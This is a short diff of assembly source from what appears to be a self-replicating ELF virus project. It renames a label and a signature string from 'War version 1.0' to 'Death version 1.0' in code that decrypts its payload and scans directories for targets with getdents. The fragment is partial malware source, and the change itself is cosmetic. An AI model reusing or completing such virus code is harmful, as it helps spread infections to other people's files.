@@ -150,7 +150,7 @@ _is_encrypted:
 	
 _decypher:
 	mov r8, 0
-	mov rdx, war - _payload
+	mov rdx, death - _payload
 	xor r9, r9
 	call .get_rip
 	.get_rip:
@@ -642,7 +642,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 				jl .nocypher
 
 				.cypher:
-					cmp r8, war - _start
+					cmp r8, death - _start
 					jge .nocypher
 					xor r10,r10
 					mov r10b, byte [rsi]
@@ -790,8 +790,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 nanoseconds:
 	ns dq 0, 1
-war:
-	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
+death:
+	db 0,'Death version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
 _timestamp:
 	times 16 db 0
 _zero:
